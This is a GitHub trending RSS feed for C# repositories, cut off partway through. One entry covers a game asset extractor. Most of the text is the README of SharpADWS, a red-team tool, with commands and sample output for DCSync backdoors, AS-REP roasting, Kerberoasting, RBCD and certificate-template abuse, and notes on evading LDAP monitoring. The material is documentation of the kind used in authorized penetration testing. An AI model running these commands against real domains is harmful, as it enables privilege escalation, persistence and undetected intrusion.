<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C# Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-02-17T01:23:31Z</updated>
  <subtitle>Daily Trending of C# in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>RazTools/Studio</title>
    <updated>2024-02-17T01:23:31Z</updated>
    <id>tag:github.com,2024-02-17:/RazTools/Studio</id>
    <link href="https://github.com/RazTools/Studio" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Modded AssetStudio with new features&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Studio&lt;/h1&gt; &#xA;&lt;p&gt;Check out the &lt;a href=&#34;https://github.com/Perfare/AssetStudio&#34;&gt;original AssetStudio project&lt;/a&gt; for more information.&lt;/p&gt; &#xA;&lt;p&gt;Note: Requires Internet connection to fetch asset_index jsons.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;How to use:&lt;/p&gt; &#xA;&lt;p&gt;Check the tutorial &lt;a href=&#34;https://gist.github.com/Modder4869/0f5371f8879607eb95b8e63badca227e&#34;&gt;here&lt;/a&gt; (Thanks to Modder4869 for the tutorial)&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;CLI Version:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Description:&#xA;&#xA;Usage:&#xA;  AssetStudioCLI &amp;lt;input_path&amp;gt; &amp;lt;output_path&amp;gt; [options]&#xA;&#xA;Arguments:&#xA;  &amp;lt;input_path&amp;gt;   Input file/folder.&#xA;  &amp;lt;output_path&amp;gt;  Output folder.&#xA;&#xA;Options:&#xA;  --silent                                                Hide log messages.&#xA;  --type &amp;lt;Texture2D|Sprite|etc..&amp;gt;                         Specify unity class type(s)&#xA;  --filter &amp;lt;filter&amp;gt;                                       Specify regex filter(s).&#xA;  --game &amp;lt;BH3|CB1|CB2|CB3|GI|SR|TOT|ZZZ&amp;gt; (REQUIRED)       Specify Game.&#xA;  --map_op &amp;lt;AssetMap|Both|CABMap|None&amp;gt;                    Specify which map to build. [default: None]&#xA;  --map_type &amp;lt;JSON|XML&amp;gt;                                   AssetMap output type. [default: XML]&#xA;  --map_name &amp;lt;map_name&amp;gt;                                   Specify AssetMap file name.&#xA;  --group_assets_type &amp;lt;ByContainer|BySource|ByType|None&amp;gt;  Specify how exported assets should be grouped. [default: 0]&#xA;  --no_asset_bundle                                       Exclude AssetBundle from AssetMap/Export.&#xA;  --no_index_object                                       Exclude IndexObject/MiHoYoBinData from AssetMap/Export.&#xA;  --xor_key &amp;lt;xor_key&amp;gt;                                     XOR key to decrypt MiHoYoBinData.&#xA;  --ai_file &amp;lt;ai_file&amp;gt;                                     Specify asset_index json file path (to recover GI containers).&#xA;  --version                                               Show version information&#xA;  -?, -h, --help                                          Show help and usage information&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;NOTES:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;- in case of any &#34;MeshRenderer/SkinnedMeshRenderer&#34; errors, make sure to enable &#34;Disable Renderer&#34; option in &#34;Export Options&#34; before loading assets.&#xA;- in case of need to export models/animators without fetching all animations, make sure to enable &#34;Ignore Controller Anim&#34; option in &#34;Options -&amp;gt; Export Options&#34; before loading assets.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;Special Thank to:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Perfare: Original author.&lt;/li&gt; &#xA; &lt;li&gt;Khang06: &lt;a href=&#34;https://github.com/khang06/genshinblkstuff&#34;&gt;Project&lt;/a&gt; for extraction.&lt;/li&gt; &#xA; &lt;li&gt;Radioegor146: &lt;a href=&#34;https://github.com/radioegor146/gi-asset-indexes&#34;&gt;Asset-indexes&lt;/a&gt; for recovered/updated asset_index&#39;s.&lt;/li&gt; &#xA; &lt;li&gt;Ds5678: &lt;a href=&#34;https://github.com/AssetRipper/AssetRipper&#34;&gt;AssetRipper&lt;/a&gt;[&lt;a href=&#34;https://discord.gg/XqXa53W2Yh&#34;&gt;discord&lt;/a&gt;] for information about Asset Formats &amp;amp; Parsing.&lt;/li&gt; &#xA; &lt;li&gt;mafaca: &lt;a href=&#34;https://github.com/mafaca/UtinyRipper&#34;&gt;uTinyRipper&lt;/a&gt; for &lt;code&gt;YAML&lt;/code&gt; and &lt;code&gt;AnimationClipConverter&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>wh0amitz/SharpADWS</title>
    <updated>2024-02-17T01:23:31Z</updated>
    <id>tag:github.com,2024-02-17:/wh0amitz/SharpADWS</id>
    <link href="https://github.com/wh0amitz/SharpADWS" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Active Directory reconnaissance and exploitation for Red Teams via the Active Directory Web Services (ADWS).&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;SharpADWS&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/wh0amitz/SharpADWS/raw/master/README-ZH-CN.md&#34;&gt;中文文档&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Active Directory reconnaissance and exploitation for Red Teams via the Active Directory Web Services (ADWS).&lt;/p&gt; &#xA;&lt;h2&gt;Overview&lt;/h2&gt; &#xA;&lt;p&gt;SharpADWS is an Active Directory reconnaissance and exploitation tool for Red Teams that collects and modifies Active Directory data via the Active Directory Web Services (ADWS) protocol.&lt;/p&gt; &#xA;&lt;p&gt;Typically, enumeration or manipulation of Active Directory occurs through the LDAP protocol. SharpADWS has the ability to extract or modify Active Directory data without communicating directly with the LDAP server. Under ADWS, LDAP queries are wrapped in a series of SOAP messages and then sent to the ADWS server using a NET TCP Binding encrypted channel. The ADWS server then unpacks the LDAP query locally and forwards it to the LDAP server running on the same domain controller.&lt;/p&gt; &#xA;&lt;p&gt;Active Directory Web Services (ADWS) is automatically turned on when Active Directory Domain Services (ADDS) is installed, making SharpADWS universal across all domain environments.&lt;/p&gt; &#xA;&lt;h2&gt;Good Point&lt;/h2&gt; &#xA;&lt;p&gt;One of the main benefits of using ADWS for LDAP post-exploitation is that it is relatively unknown, and since LDAP traffic is not sent over the network, it is not easily detected by common monitoring tools. ADWS runs a completely different service than LDAP, is available on TCP port 9389, and uses the SOAP protocol as its interface.&lt;/p&gt; &#xA;&lt;p&gt;While researching ADWS, we noticed that since it is a SOAP web service, the actual execution of the LDAP query is done locally on the domain controller. This provides a number of interesting side effects that turn out to be beneficial. For example, when analyzing LDAP queries on a domain controller, you may notice that the queries originate from 127.0.0.1 logs, which in many cases will be ignored.&lt;/p&gt; &#xA;&lt;p&gt;A secondary benefit of this is that the activity does not show up in DeviceEvents under the LDAPSearch action type, which means very little telemetry data is available.&lt;/p&gt; &#xA;&lt;h2&gt;Protocol Implementation&lt;/h2&gt; &#xA;&lt;p&gt;SharpADWS implements &lt;a href=&#34;https://learn.microsoft.com/zh-cn/openspecs/windows_protocols/ms-addm/af3eb9be-b407-4423-a707-387fedbbaf1d&#34;&gt;MS-ADDM&lt;/a&gt;, &lt;a href=&#34;https://learn.microsoft.com/zh-cn/openspecs/windows_protocols/ms-wstim/08164681-df91-49bd-a0ea-ce949d1cc536&#34;&gt;MS-WSTIM&lt;/a&gt; and &lt;a href=&#34;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsds/2ded136c-2fe2-4f7d-8d09-a7118815c6bb&#34;&gt;MS-WSDS&lt;/a&gt; protocol, you can use the source code of this project to easily implement the following operations on Active Directory Web Services:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Enumerate：Creates a context that maps to the specified search query filter.&lt;/li&gt; &#xA; &lt;li&gt;Pull：Retrieve the result object in the context of a specific enumeration.&lt;/li&gt; &#xA; &lt;li&gt;Renew：Updates the expiration time of the specified enumeration context.&lt;/li&gt; &#xA; &lt;li&gt;GetStatus：Gets the expiration time of the specified enumeration context.&lt;/li&gt; &#xA; &lt;li&gt;Release：Releases the specified enumeration context.&lt;/li&gt; &#xA; &lt;li&gt;Delete：Delete existing objects.&lt;/li&gt; &#xA; &lt;li&gt;Get：Retrieve one or more properties from an object.&lt;/li&gt; &#xA; &lt;li&gt;Put：Modify the contents of one or more properties on an object. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Add：Adds the specified property value to the specified property&#39;s value set, or creates the property if it does not already exist on the target object.&lt;/li&gt; &#xA;   &lt;li&gt;Replace：Replaces the set of values in the specified property with the values specified in the operation, or creates the property if it does not already exist on the target object. If no value is specified in the operation, all values on the currently specified attribute will be deleted.&lt;/li&gt; &#xA;   &lt;li&gt;Delete：Removes the specified attribute value from the specified attribute. If no value is specified, all values will be deleted. If the specified property does not exist on the target object, the PUT request fails.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Create：Create a new object.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;p&gt;The command line argument &lt;code&gt;-h&lt;/code&gt; can be used to display the following usage information:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe -h&#xA;&#xA;SharpADWS 1.0.0-beta - Copyright (c) 2024 WHOAMI (whoamianony.top)&#xA;&#xA;  -h                      Display this help screen&#xA;&#xA;Connection options:&#xA;  -d                      Specify domain for enumeration&#xA;  -u                      Username to use for ADWS Connection&#xA;  -p                      Password to use for ADWS Connection&#xA;&#xA;Supported methods:&#xA;  Cache                   Dump all objectSids to cache file for Acl methods&#xA;  Acl                     Enumerate and analyze DACLs for specified objects, specifically Users, Computers, Groups, Domains, DomainControllers and GPOs&#xA;  DCSync                  Enumerate all DCSync-capable accounts and can set DCSync backdoors&#xA;  DontReqPreAuth          Enumerates all accounts that do not require kerberos preauthentication, and can enable this option for accounts&#xA;  Kerberoastable          Enumerates all Kerberoastable accounts, and can write SPNs for accounts&#xA;  AddComputer             Add a machine account within the scope of ms-DS-MachineAccountQuota for RBCD attack&#xA;  RBCD                    Read, write and remove msDS-AllowedToActOnBehalfOfOtherIdentity attributes for Resource-Based Constrained Delegation attack&#xA;  Certify                 Enumerate all ADCS data like Certify.exe, and can write template attributes&#xA;  Whisker                 List, add and remove msDS-KeyCredentialLink attribute like Whisker.exe for ShadowCredentials attack&#xA;  FindDelegation          Enumerate all delegation relationships for the target domain&#xA;&#xA;Acl options:&#xA;  -dn                     RFC 2253 DN to base search from&#xA;  -scope                  Set your Scope, support Base (Default), Onelevel, Subtree&#xA;  -trustee                The sAMAccountName of a security principal to check for its effective permissions&#xA;  -right                  Filter DACL for a specific AD rights&#xA;  -rid                    Specify a rid value and filter out DACL that security principal&#39;s rid is greater than it&#xA;  -user                   Enumerate DACL for all user objects&#xA;  -computer               Enumerate DACL for all computer objects&#xA;  -group                  Enumerate DACL for all group objects&#xA;  -domain                 Enumerate DACL for all domain objects&#xA;  -domaincontroller       Enumerate DACL for all domain controller objects&#xA;  -gpo                    Enumerate DACL for all gpo objects&#xA;&#xA;DCSync options:&#xA;  -action [{list, write}] Action to operate on DCSync method&#xA;          list            List all accounts with DCSync permissions&#xA;          write           Escalate accounts with DCSync permissions&#xA;  -target                 Specify the sAMAccountName of the account&#xA;&#xA;DontReqPreAuth options:&#xA;  -action [{list, write}] Action to operate on DontReqPreAuth method&#xA;          list            List all accounts that do not require kerberos preauthentication&#xA;          write           Enable do not require kerberos preauthentication for an account&#xA;  -target                 Specify the sAMAccountName of the account&#xA;&#xA;Kerberoastable options:&#xA;  -action [{list, write}] Action to operate on Kerberoastable method&#xA;          list            List all kerberoastable accounts&#xA;          write           Write SPNs for an account to kerberoast&#xA;  -target                 Specify the sAMAccountName of the account&#xA;&#xA;AddComputer options:&#xA;  -computer-name          Name of computer to add, without &#39;$&#39; suffix&#xA;  -computer-pass          Password to set for the computer&#xA;&#xA;RBCD options:&#xA;  -action [{read,write,remove}]&#xA;                          Action to operate on RBCD method&#xA;          read            Read the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the account&#xA;          write           Write the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the account&#xA;          remove          Remove the msDS-AllowedToActOnBehalfOfOtherIdentity attribute value of the account added by the write action&#xA;&#xA;Certify options:&#xA;  -action [{find, modify}]&#xA;                          Action to operate on Certify method&#xA;          find            Find all CA and certificate templates&#xA;          modify          Modify certificate templates&#xA;  -enrolleeSuppliesSubject&#xA;                          Enumerate certificate templates with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag for find action,&#xA;                          and can enable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag for modify action&#xA;  -clientAuth             Enumerate certificate templates with client authentication pKIExtendedKeyUsage for find action,&#xA;                          and can enable Client Authentication for modify action&#xA;&#xA;Whisker options:&#xA;  -action [{list, add, remove}]&#xA;                          Action to operate on ShadowCredentials method&#xA;          list            List all the values of the msDS-KeyCredentialLink attribute for an account&#xA;          add             Add a new value to the msDS-KeyCredentialLink attribute for an account&#xA;          remove          Remove a value from the msDS-KeyCredentialLink attribute for an account&#xA;  -device-id              Specify the DeviceID to remove&#xA;  -target                 Specify the sAMAccountName of the account&#xA;&#xA;FindDelegation options:&#xA;  No options, just run!&#xA;  &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Cache&lt;/h3&gt; &#xA;&lt;p&gt;When SharpADWS enumerates the ACL, in order not to perform additional ADWS requests for each unknown trustee object, it is necessary to create a complete cache of all account objects in advance through the cache method and save it to a file, thereby avoiding a large number of (unnecessary) flow. The cache contains a mapping of each account object name within the current domain to its objectSid.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe Cache&#xA;&#xA;[*] Cache file has been generated: object.cache&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Acl&lt;/h3&gt; &#xA;&lt;p&gt;The Acl method can enumerate the DACL of the object specifying &lt;code&gt;-dn&lt;/code&gt;, and supports filtering the enumerated DACL through the &lt;code&gt;-trustee&lt;/code&gt;, &lt;code&gt;-right&lt;/code&gt; and &lt;code&gt;-rid&lt;/code&gt; parameters. For example, we want to enumerate all Domain Controller objects and filter out the DACL whose trustee is Marcus, as follows:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe acl -dn &#34;OU=Domain Controllers,DC=corp,DC=local&#34; -scope Subtree -trustee Marcus&#xA;&#xA; Severity              : Critical&#xA; ObjectDN              : CN=DC01,OU=Domain Controllers,DC=corp,DC=local&#xA; AccessControlType     : Allow&#xA; ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite&#xA; ObjectType            : All&#xA; Trustee               : Marcus&#xA; IsInherited           : False&#xA; &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For another example, we want to enumerate all User objects and filter out DACLs with GenericWrite permissions and trustee RID greater than 1000, as shown below:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe acl -dn &#34;CN=Users,DC=corp,DC=local&#34; -scope Subtree -right Generic -rid 1000&#xA;&#xA; Severity              : Critical&#xA; ObjectDN              : CN=Bob,CN=Users,DC=corp,DC=local&#xA; AccessControlType     : Allow&#xA; ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite&#xA; ObjectType            : All&#xA; Trustee               : Marcus&#xA; IsInherited           : False&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In addition, the Acl method also supports enumeration of specific objects:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;SharpADWS.exe -user                # Enumerate DACL for all user objects&#xA;SharpADWS.exe -computer            # Enumerate DACL for all computer objects&#xA;SharpADWS.exe -group               # Enumerate DACL for all group objects&#xA;SharpADWS.exe -domain              # Enumerate DACL for all domain objects&#xA;SharpADWS.exe -domaincontroller    # Enumerate DACL for all domain controller objects&#xA;SharpADWS.exe -gpo                 # Enumerate DACL for all gpo objects&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;**It should be noted that the use of Acl Method must rely on the mapping cache that has been established through Cache method. **&lt;/p&gt; &#xA;&lt;h3&gt;DCSync&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;code&gt;list&lt;/code&gt; action of the DCSync method can query all accounts that have been granted the DS-Replication-Get-Changes, DS-Replication-Get-Changes-All and DS-Replication-Get-Changes-In-Filtered-Set permissions, as follows Show:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe DCSync -action list&#xA;&#xA; Severity              : Info&#xA; ObjectDN              : DC=corp,DC=local&#xA; AccessControlType     : Allow&#xA; ActiveDirectoryRights : ExtendedRight&#xA; ObjectType            : DS-Replication-Get-Changes-All&#xA; Trustee               : Administrators&#xA; IsInherited           : False&#xA;&#xA; Severity              : Info&#xA; ObjectDN              : DC=corp,DC=local&#xA; AccessControlType     : Allow&#xA; ActiveDirectoryRights : ExtendedRight&#xA; ObjectType            : DS-Replication-Get-Changes-All&#xA; Trustee               : Domain Controllers&#xA; IsInherited           : False&#xA;&#xA; Severity              : Critical&#xA; ObjectDN              : DC=corp,DC=local&#xA; AccessControlType     : Allow&#xA; ActiveDirectoryRights : ExtendedRight&#xA; ObjectType            : DS-Replication-Get-Changes-All&#xA; Trustee               : Alice&#xA; IsInherited           : False&#xA; &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;It should be noted that the &lt;code&gt;list&lt;/code&gt; action of DCSync Method must rely on the mapping cache that has been established through Cache method.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Additionally, given sufficient permissions, you can grant DCSync permissions to an account via &lt;code&gt;write&lt;/code&gt; to establish a domain persistence backdoor:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe DCSync -action write -target Marcus&#xA;&#xA;[*] Account Marcus now has DCSync privieges on the domain.&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;DontReqPreAuth&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;code&gt;list&lt;/code&gt; action of the DontReqPreAuth method can find all accounts with the &#34;Do not require kerberos preauthentication&#34; option set, as shown below:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe DontReqPreAuth -action list&#xA;&#xA;[*] Found users that do not require kerberos preauthentication:&#xA;[*]     CN=Bob,CN=Users,DC=corp,DC=local&#xA;[*]     CN=Alice,CN=Users,DC=corp,DC=local&#xA;[*]     CN=John,CN=Users,DC=corp,DC=local&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Additionally, you can abuse WriteProperty permissions on the target account&#39;s userAccountControl property by enabling the &#34;Do not require kerberos preauthentication&#34; option for that account via &lt;code&gt;write&lt;/code&gt; action to perform an AS-REP Roasting attack:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe DontReqPreAuth -action write -target Administrator&#xA;&#xA;[*] Set DontReqPreAuth for user Administrator successfully!&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Kerberoastable&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;code&gt;list&lt;/code&gt; action of the Kerberoastable method can find all accounts with SPN set up, as shown below:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe Kerberoastable -action list&#xA;&#xA;[*] Found kerberoastable users:&#xA;[*] CN=krbtgt,CN=Users,DC=corp,DC=local&#xA;[*]     kadmin/changepw&#xA;[*] CN=Bob,CN=Users,DC=corp,DC=local&#xA;[*]     WWW/win-iisserver.corp.local/IIS&#xA;[*]     TERMSERV/win-iisserver.corp.local&#xA;[*] CN=John,CN=Users,DC=corp,DC=local&#xA;[*]     TERMSERV/WIN-SERVER2026&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Additionally, you can abuse WriteProperty permissions on the target account&#39;s servicePrincipalName property to perform a Kerberoasting attack by adding an SPN to that account (user accounts only) via &lt;code&gt;write&lt;/code&gt; action:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe Kerberoastable -action write -target Administrator&#xA;&#xA;[*] Kerberoast user Administrator successfully!&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;AddComputer&lt;/h3&gt; &#xA;&lt;p&gt;The AddComputer method allows you to create a new computer account within the scope of the &lt;code&gt;ms-DS-MachineAccountQuota&lt;/code&gt; attribute value, which can be used in subsequent RBCD attacks.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe AddComputer -computer-name PENTEST$ -computer-pass Passw0rd&#xA;&#xA;[*] Successfully added machine account PENTEST$ with password Passw0rd.&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;RBCD&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;code&gt;read&lt;/code&gt; action of the RBCD method can read the &lt;code&gt;msDS-AllowedToActOnBehalfOfOtherIdentity&lt;/code&gt; attribute value of the specified account object to check who has the right to resources delegate to the account, as shown below:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe RBCD -action read -delegate-to DC01$&#xA;&#xA;[*] Accounts allowed to act on behalf of other identity:&#xA;[*]     WIN-IISSERVER$    (S-1-5-21-1315326963-2851134370-1073178800-1106)&#xA;[*]     WIN-MSSQL$    (S-1-5-21-1315326963-2851134370-1073178800-1103)&#xA;[*]     WIN-PC8087$    (S-1-5-21-1315326963-2851134370-1073178800-1117)&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The &lt;code&gt;write&lt;/code&gt; action of the RBCD method can write to the &lt;code&gt;msDS-AllowedToActOnBehalfOfOtherIdentity&lt;/code&gt; property of the target account object for Resource-Based Constrained Delegation attacks. As shown below, we first create a new extreme account &lt;code&gt;PENTEST$&lt;/code&gt; using the AddComputer method, and then we can execute the following command to write the SID of &lt;code&gt;PENTEST$&lt;/code&gt; into the &lt;code&gt;msDS-AllowedToActOnBehalfOfOtherIdentity&lt;/code&gt; attribute of &lt;code&gt;DC01$&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe RBCD -action write -delegate-to DC01$ -delegate-from PENTEST$&#xA;&#xA;[*] Delegation rights modified successfully!&#xA;[*] PENTEST$ can now impersonate users on DC01$ via S4U2Proxy&#xA;[*] Accounts allowed to act on behalf of other identity:&#xA;[*]     PENTEST$    (S-1-5-21-1315326963-2851134370-1073178800-1113)&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In addition, the SID added in &lt;code&gt;write&lt;/code&gt; action can be removed from the &lt;code&gt;msDS-AllowedToActOnBehalfOfOtherIdentity&lt;/code&gt; attribute of the target object through &lt;code&gt;remove&lt;/code&gt; action:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe RBCD -action remove -delegate-to DC01$ -delegate-from PENTEST$&#xA;&#xA;[*] Delegation rights modified successfully!&#xA;[*] Accounts allowed to act on behalf of other identity has been removed:&#xA;[*]     PENTEST$    (S-1-5-21-1315326963-2851134370-1073178800-1113)&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Certify&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;code&gt;find&lt;/code&gt; action of the Certify method can enumerate the data in ADCS, including all certificate authorities and certificate templates, just like &lt;a href=&#34;https://github.com/GhostPack/Certify&#34;&gt;Certify&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe Certify -action find&#xA;&#xA;[*] Find CA and certificate templates&#xA;[*] Using the search base &#39;CN=Configuration,DC=corp,DC=local&#39;&#xA;[*] Listing info about the Enterprise CA &#39;corp-DC01-CA&#39;&#xA;&#xA;    Enterprise CA Name              : corp-DC01-CA&#xA;    DNS Name                        : DC01.corp.local&#xA;    FullName                        : DC01.corp.local\corp-DC01-CA&#xA;    Certificate Subject             : CN=corp-DC01-CA, DC=corp, DC=local&#xA;    Certificate Serial Number       : 2D975C2D49AE4BB7432682E1708C8834&#xA;    Certificate Validity Start      : 2/13/2024 5:55:36 PM&#xA;    Certificate Validity End        : 2/13/2029 6:05:36 PM&#xA;    CA Permissions                  :&#xA;         Enrollment Rights          :&#xA;                                    : Authenticated Users&#xA;         Object Control Permissions :&#xA;             ManageCA               :&#xA;                                    : Enterprise Admins&#xA;                                    : DC01&#xA;                                    : Domain Admins&#xA;             ManageCertificates     :&#xA;                                    : Enterprise Admins&#xA;                                    : DC01&#xA;             WriteDacl              :&#xA;                                    : Enterprise Admins&#xA;                                    : DC01&#xA;                                    : Domain Admins&#xA;             WriteOwner             :&#xA;                                    : Enterprise Admins&#xA;                                    : DC01&#xA;                                    : Domain Admins&#xA;             WriteProperty          :&#xA;                                    : Enterprise Admins&#xA;                                    : DC01&#xA;                                    : Domain Admins&#xA;&#xA;[*] Available Certificates Templates&#xA;&#xA;    CA Name                         : CORP-DC01-CA&#xA;    Template Name                   : User&#xA;    Enabled                         : True&#xA;    Client Authentication           : True&#xA;    Enrollment Agent                : False&#xA;    Any Purpose                     : False&#xA;    Enrollee Supplies Subject       : False&#xA;    pKIExtendedKeyUsage             : Encrypting File System  Secure Email  Client Authentication&#xA;    msPKI-Certificate-Name-Flag     : SUBJECT_ALT_REQUIRE_UPN  SUBJECT_ALT_REQUIRE_EMAIL  SUBJECT_REQUIRE_EMAIL  SUBJECT_REQUIRE_DIRECTORY_PATH&#xA;    msPkI-Enrollment-Flag           : INCLUDE_SYMMETRIC_ALGORITHMS  PUBLISH_TO_DS  AUTO_ENROLLMENT&#xA;    msPKI-Private-Key-Flag          : EXPORTABLE_KEY&#xA;    CA Permissions                  :&#xA;         Enrollment Rights          :&#xA;                                    : Domain Admins&#xA;                                    : Domain Users&#xA;                                    : Enterprise Admins&#xA;         Object Control Permissions :&#xA;             WriteDacl              :&#xA;                                    : Domain Admins&#xA;                                    : Enterprise Admins&#xA;             WriteOwner             :&#xA;                                    : Domain Admins&#xA;                                    : Enterprise Admins&#xA;             WriteProperty          :&#xA;                                    : Domain Admins&#xA;                                    : Enterprise Admins&#xA;                                    : Domain Users&#xA;&#xA;    CA Name                         :&#xA;    Template Name                   : UserSignature&#xA;    Enabled                         : False&#xA;    Client Authentication           : True&#xA;    Enrollment Agent                : False&#xA;    Any Purpose                     : False&#xA;    Enrollee Supplies Subject       : False&#xA;    pKIExtendedKeyUsage             : Secure Email  Client Authentication&#xA;    msPKI-Certificate-Name-Flag     : SUBJECT_ALT_REQUIRE_UPN  SUBJECT_ALT_REQUIRE_EMAIL  SUBJECT_REQUIRE_EMAIL  SUBJECT_REQUIRE_DIRECTORY_PATH&#xA;    msPkI-Enrollment-Flag           : AUTO_ENROLLMENT&#xA;    msPKI-Private-Key-Flag          : ATTEST_NONE&#xA;    CA Permissions                  :&#xA;         Enrollment Rights          :&#xA;                                    : Domain Admins&#xA;                                    : Domain Users&#xA;                                    : Enterprise Admins&#xA;         Object Control Permissions :&#xA;             WriteDacl              :&#xA;                                    : Domain Admins&#xA;                                    : Enterprise Admins&#xA;             WriteOwner             :&#xA;                                    : Domain Admins&#xA;                                    : Enterprise Admins&#xA;             WriteProperty          :&#xA;                                    : Domain Admins&#xA;                                    : Enterprise Admins&#xA;                                    : Domain Users&#xA;&#xA;# ...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In addition, &lt;code&gt;find&lt;/code&gt; action supports the &lt;code&gt;-enrolleeSuppliesSubject&lt;/code&gt; and &lt;code&gt;-clientAuth&lt;/code&gt; options, which can filter out all certificate templates that have the &lt;code&gt;CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT&lt;/code&gt; flag turned on and support Client Authentication:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe Certify -action find -enrolleeSuppliesSubject -clientAuth&#xA;&#xA;[*] Find CA and certificate templates&#xA;[*] Using the search base &#39;CN=Configuration,DC=corp,DC=local&#39;&#xA;[*] Listing info about the Enterprise CA &#39;corp-DC01-CA&#39;&#xA;&#xA;    # ...&#xA;&#xA;[*] Available Certificates Templates&#xA;&#xA;    CA Name                         : CORP-DC01-CA&#xA;    Template Name                   : User&#xA;    Enabled                         : 